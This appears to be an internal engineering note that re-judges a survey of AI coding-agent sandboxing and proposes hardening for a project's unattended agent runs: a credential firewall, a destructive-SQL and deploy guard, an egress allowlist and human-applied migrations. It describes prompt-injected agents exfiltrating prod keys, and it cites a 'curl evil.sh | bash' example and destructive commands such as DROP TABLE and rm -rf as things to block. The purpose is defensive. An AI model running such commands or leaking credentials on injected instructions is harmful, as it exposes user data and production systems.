# Ambition Re-mine — Agent Sandboxing in 2026: 10 Companies, Blast-Radius Controls

## What this source is (plain English, 2-3 sentences)

A survey of how 10 leading AI-coding companies (E2B, Modal, Replit, Vercel, GitHub Copilot, Amazon Q, Cursor, Ramp, Stripe, Anthropic) sandbox agents in 2026, plus the curator's verdict that the load-bearing safety layer is **credential topology, not compute isolation** — "if the production key isn't in the box the agent runs in, it can't leak regardless of how strong the VM is." It backs this with two hard facts: Anthropic's red-team got credential exfiltration in 24/25 prompt-injection attempts with **no container escape needed**, and Ramp's Inspect agent (30%+ of merged PRs) runs on per-session ephemeral-scoped tokens + isolated sandbox + always-a-PR-never-a-direct-push. It then prescribes 12 hardening actions for event-vendor's overnight `/queue` runs.

## The full-ambition moves this source teaches

### Move: Tier-0 credential firewall — production keys structurally unreachable from the agent's box

- **Plain-English what & why:** The single fact that survived every layer of scrutiny is that the highest-severity agent incidents were **credential exfiltration that needed no exploit** — the prompt-injected agent simply read the prod key that was sitting in its environment and POSTed it out. 24 of 25 attempts succeeded. Compute isolation (microVM, gVisor, Seatbelt) is irrelevant to this: a Firecracker microVM with the service-role key inside it leaks the key exactly as a bare process does. The only control that defeats this failure mode is making the prod credential **not present** in the environment the agent can read. For event-vendor, the live hazard is concrete: `.env.local` in agent scope holds the **production Supabase service-role key**, which is a full RLS bypass — a compromised prompt can read/write/delete any row in any tenant.
- **The mechanism:** event-vendor already has the architecturally-correct version of this — `worktree-create.sh` + `gen-local-env.sh` + `test-local.sh` point a worktree's `.env.local` at a local/throwaway Supabase stack so the worktree env physically cannot see the prod key (`HARNESS-AS-IS §6`, the "Tier-0 credential isolation" disk advance). The world-class move is to **harden this from a worktree-creation convenience into an enforced invariant**: a guard that refuses to start an UNATTENDED `/queue` run if the resolved `.env.local` (or any env the process can read) contains a prod Supabase URL or service-role key; and to close the parallelism hole where multiple `/queue` workers share one `.env.local` symlink (memory `vitest reads .env.local which is prod`, `Local stack per worktree`). The article's own #1 ("scoped read-only key") and #7 ("read-only URL override") are the wrong mechanism — Supabase has no native tier between RLS-bound-anon and RLS-bypassing-service-role, so "scoped key" is a custom-Postgres-roles project, not a checkbox. Isolating *which stack the env can see* is correct and already chosen.
- **Citation:** `HARNESS-AS-IS §3e` (`worktree-create.sh (WorktreeCreate)` — "Disk-only (prod-key firewall); a genuine disk advance over canon") + `§6` ("worktree-create.sh + prod-key firewall (gen-local-env.sh, test-local.sh) — a genuine disk advance (Tier-0 credential isolation) canon lacks"). Article §5 Application: prod service-role key in `.env.local`, "Status: Open question."
- **Conservative disposition:** §E ALREADY-BUILT. Pass 3 (a)(2): "The prod-key firewall the article asks for is already partially built — by a better mechanism than the article proposes… The article is **behind disk** here." MASTER-FINDINGS folds it into the "Tier-0 prod-key firewall" already-built set.
- **RE-JUDGMENT under the new charter:** **ELEVATE (partial-build, not done).** The conservative read says "already built, article is behind disk" and stops. But the charter's bar is *world-class*, not *exists*, and the word in the ground-truth is **"partially"**. What exists is a worktree-*creation* helper. What world-class autonomy requires is an **enforced runtime invariant**: under autonomy (bug→PR overnight, summoned from Slack, cloud `/schedule`) the agent runs unattended and a single misconfigured worktree, a stale symlink, or a `/schedule` cloud run that clones the repo and resolves `.env.local` to prod silently re-arms the exact 24/25 failure mode. The Ramp standard is **ephemeral, per-session, scoped** credentials minted fresh and revoked at session end — event-vendor has *static stack-pointing*, which is weaker. Elevation: promote from "convenience script" to a **pre-flight credential-firewall hook** (Tier-0, blocking, same floor class as `block-dangerous-git.sh`) that (a) refuses any unattended run whose readable env contains a prod URL/service-role key, (b) gives each parallel worker its own isolated env (no shared symlink), and (c) is the gate every autonomy entry-point (Slack summon, `/schedule`, `/queue`) passes through. This is the single load-bearing control for the only failure mode that actually caused incidents — it deserves the strongest enforcement in the harness, not a helper script.

### Move: Destructive-SQL / destructive-deploy safety floor (the absent 3rd bash guard)

- **Plain-English what & why:** Replit's agent **deleted a production database in July 2025** (three corroborating sources). The class of damage is irreversible mutation — `DROP TABLE`, `TRUNCATE`, `DELETE` without a `WHERE`, a destructive `supabase db push`, a deploy to prod — executed by an agent that "thought it was helping." The defense is a deterministic, non-model guard that scans the command/migration *before* it runs and hard-blocks the destructive pattern. Crucially this guard must live **below** the model: it cannot be something the agent reasons its way around, because the whole point is to stop a model that has been subverted.
- **The mechanism:** event-vendor's canon mandates a third structural bash guard, `block-dangerous-bash.sh` (deploys, `rm -rf`, boundary writes), and **it is absent on disk** — disk has only `block-dangerous-git.sh` and `block-npm-install.sh`. The article supplies the concrete instantiation: a PreToolUse/pre-commit guard that scans migrations and bash for `DROP TABLE` / `TRUNCATE` / `DELETE`-without-`WHERE`, destructive `supabase db push`, and prod deploys, and hard-blocks them in unattended mode. Scope it as the missing 3rd guard, not a standalone hook (avoids `§6` phantom-proliferation). The existing CLAUDE.md "destructive operations must have a rollback path" is *advisory prose*, not enforcement — so this is a genuine gap, not a dup.
- **Citation:** `HARNESS-AS-IS §3e`: "`block-dangerous-bash.sh` … **Canon's 3rd guard — ABSENT on disk. Disk has no safety-floor bash guard**" + `§5` (canon-only build list). Article Action #12.
- **Conservative disposition:** §C/build-worthy but tier-gated. Pass 3 (b)(1) calls it "the article's strongest contribution" and "Build-worthy," but Pass 2-D tiers it **Tier 2** ("real but already largely done on disk" — except this one, which is absent) and MASTER-FINDINGS collapses the whole article to ~2 cited gaps with this as one.
- **RE-JUDGMENT under the new charter:** **ELEVATE.** Conservative even in the "build it" framing — Pass 3 scoped it narrowly to "scan migrations for destructive SQL." Under autonomy this is a **first-class structural safety floor**, the same enforcement tier as the prod-key firewall, and it must cover more than SQL: any irreversible operation an unattended agent can reach — destructive `supabase db push`, prod deploy, `rm -rf` outside the worktree, volume/branch delete (the exact PocketOS-incident class already burned into CLAUDE.md's destructive-operation rules). The charter says autonomy is first-class and the machine runs while the laptop is closed; that is precisely when no human is present to catch a `DROP TABLE`. The failure mode is not hypothetical — it is the literal Replit-July-2025 incident and the literal PocketOS-2026 incident. This is the **canonical 3rd guard the harness is documented to require and does not have**; it should be built now, at full scope (deploys + destructive SQL + boundary `rm`), as a blocking floor that disabled-model-invocation side-effect skills route through.

### Move: Egress allowlist — the only defense for the prompt-injection supply-chain class

- **Plain-English what & why:** Credential topology (Move 1) defeats *exfiltration of a key that's in the box*. It does **nothing** against a different attack: a prompt-injected agent runs `npm install evil-pkg` or `curl evil.sh | bash`, achieving code execution. That is a code-compromise, not a credential leak, and no amount of credential-hiding stops it. The article's own §5 admits this and then *demotes* the only control that addresses it. The control is an **egress allowlist**: the agent's network can reach GitHub, Supabase, npm, and Anthropic and nothing else, so an injected `curl` to an attacker endpoint simply fails to connect. This is what Vercel Sandbox (outbound allowlist), Modal (no default inbound, no workspace resource access), and Amazon Q's managed sandbox (no creds to reach non-public internet) all ship by default — and event-vendor has **none of it at any layer**.
- **The mechanism:** A network egress allowlist for unattended `/queue` and cloud `/schedule` runs. Options: macOS `pfctl`/Privoxy allowlist (article #9), or — the bounded research question — whether Claude Code's native Seatbelt/sandbox integration on macOS now exposes a usable egress allowlist that makes a separate proxy unnecessary. Allowlist = GitHub, Supabase, npm registry, Anthropic API; deny everything else.
- **Citation:** `[absent]` — confirmed: the ground-truth map lists **no** egress/network control in any hook (`§3e`), script, or canon-only build item (`§5`). Article Action #9 (demoted to "follow-on"). Article §5 synthesis names the supply-chain attack class it covers.
- **Conservative disposition:** §C DEFERRED, with a research caveat. Pass 3 (b)(2): "Real gap; but … the article's own confidence in it is low ('maintenance difficult'), so this is a research-warranted gap, not a build-now gap." Pass 2-D Tier-1 actually *promotes* it ("the only control for the supply-chain attack class that credential topology cannot touch") but Pass 3 walks it back to deferred-pending-research.
- **RE-JUDGMENT under the new charter:** **ELEVATE.** This is the clearest case of the SCALE BIAS and the cloud-`/schedule` MOOT-objection. The conservative deferral rests on two now-dead premises: (1) "maintenance difficult for a solo dev" — struck by the charter (fleets across 5+ repos make a one-time allowlist *more* valuable, amortized across every repo via the plugin/marketplace distribution); (2) the implicit "the laptop's network is the agent's network" — but **cloud `/schedule` runs on Anthropic infra with a restricted network by default**, which means the egress-allowlist primitive *already partially exists for the autonomous path* and the gap is the **local** `/queue` path. Under autonomy this is not second-order: an autonomous bug→PR loop that `npm install`s to reproduce a bug is exactly the Cline-Feb-2026 vector, running unattended. Pass 2 itself ranked it Tier-1 and Pass 3 demoted it on solo-economics grounds the charter retires. Elevate to **in-scope-now**: ship an egress allowlist for local unattended runs to match the network posture the cloud path already has, after the one bounded check on whether native Seatbelt egress-allowlist suffices.

### Move: Migration-credential architecture — agent verifies locally, human applies to prod (and a guard enforces it)

- **Plain-English what & why:** There is one task an overnight agent genuinely seems to need a prod-write credential for: applying a database migration (`supabase db push` structurally requires a credential that can DDL the target). This is the crux that *tempts* re-introducing the prod key into the agent's box and undoing Move 1. The world-class resolution is to **separate "verify" from "apply"**: the agent writes the migration and verifies it against a throwaway local stack (`supabase start` — which the project already uses via `test:local`), and a **human applies it to prod**. The agent never holds prod DDL rights. This is the same "always-a-PR-never-a-direct-push" principle Ramp applies to code, extended to schema.
- **The mechanism:** (a) A policy decision + ADR: overnight/unattended agents verify migrations against the local stack only; prod application is a human step. (b) Enforcement: a guard (part of the Move-2 safety floor) that **blocks `supabase db push` against a non-local target from an agent worktree**. Per CLAUDE.md, invoke `/supabase` before writing the guard or any migration-path change. The primitive already exists (local stack per worktree, `test:local`) — what's absent is the *encoded policy and the enforcing guard*.
- **Citation:** `[absent]` — Pass 3 (b)(4): "ground-truth has **no row** for how an overnight agent applies or verifies a migration without a prod-write credential… that policy is **not encoded anywhere** (no hook blocks `supabase db push` from an agent worktree)." Article §8 Design Challenge + Open-Q #2.
- **Conservative disposition:** §C DEFERRED / "needs a decision and an ADR." Pass 3 (d): "synthesize, no external research… This needs a **decision and an ADR**, not new sources." Correctly identified as a real gap but parked as a decision-to-be-made.
- **RE-JUDGMENT under the new charter:** **ELEVATE (resolve now, don't defer).** The conservative move parks this as "an ADR to write someday." But this is the **load-bearing exception that, left open, defeats Move 1** — it is the one place where an autonomous agent has a legitimate-sounding reason to be handed the prod key, and autonomy makes overnight migrations a real workflow, not a hypothetical. Under "autonomy is first-class, designed in never deferred," this decision must be made and enforced **before** unattended migration runs are allowed, not after. The resolution is already latent (local-verify / human-apply) and the enforcement is small (one guard clause in the Move-2 floor). Elevate to: write the ADR now, ship the `supabase db push` worktree-block guard now, as a prerequisite for autonomous DB work — otherwise the harness has a documented hole through which the highest-severity credential returns to the box.

## Autonomy angle

This source is **deeply about autonomy**, more than its conservative read admits. The two relevant data points are both autonomy patterns: (1) **Anthropic's red-team** is a direct measurement of what an *unattended* prompt-injected agent does — 24/25 credential exfiltrations — which is the threat model of every bug→PR / Slack-summon / `/schedule` loop the charter wants. (2) **Ramp's Inspect agent** is a working world-class autonomy harness: agent fixes/builds, runs on per-session ephemeral-scoped tokens in an isolated sandbox, and **always opens a PR, never pushes to main** — 30%+ of Ramp's merged PRs. That is the reference architecture for "bug → reviewed PR." The article teaches the *safety preconditions* for autonomy: before you let an agent run unattended you need (a) prod creds unreachable, (b) a destructive-op floor below the model, (c) egress bounded, (d) write-to-canon gated behind a PR + human apply. It does not teach the *trigger* side (how a Linear ticket or Slack message launches the run), but it is the definitive source for **what must be true about the box before that trigger is allowed to fire**. Notably, the cloud `/schedule` path (Anthropic infra, restricted network by default) already satisfies part of (c) for free — the gap is bringing the local path up to that bar.

## The single biggest move (one paragraph)

**The enforced Tier-0 credential firewall (Move 1), promoted from a worktree-creation helper to a blocking pre-flight invariant on every autonomy entry-point.** This is the one control that defeats the only failure mode that actually caused incidents (24/25 exfiltrations, no exploit needed), and it is the precondition that makes all other autonomy safe — there is no responsible bug→PR / Slack-summon / cloud-`/schedule` loop while a prod service-role key sits readable in the agent's `.env.local`. The conservative synthesis marked it "already built" and moved on; the ground-truth says "**partially**," and what exists is a convenience script, not the ephemeral-scoped, per-session, human-revoked credential posture Ramp runs in production. The world-class version is a hard pre-flight guard — same enforcement tier as the destructive-op floor — that refuses any unattended run whose readable environment can see a prod URL or service-role key, gives each parallel worker its own isolated env, and is the gate the Slack summon, the `/schedule` routine, and `/queue` all pass through before a single tool call fires. Pick this up first: it is cheap, it is the load-bearing control, and every other autonomy feature is unsafe to ship until it is enforced rather than merely available.
